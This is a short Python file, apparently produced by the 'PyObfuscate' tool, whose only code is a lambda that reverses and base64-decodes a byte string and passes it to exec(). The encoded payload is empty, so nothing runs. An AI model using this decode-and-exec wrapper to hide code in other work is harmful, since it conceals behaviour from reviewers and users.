# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Fri Mar 31 07:15:05 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))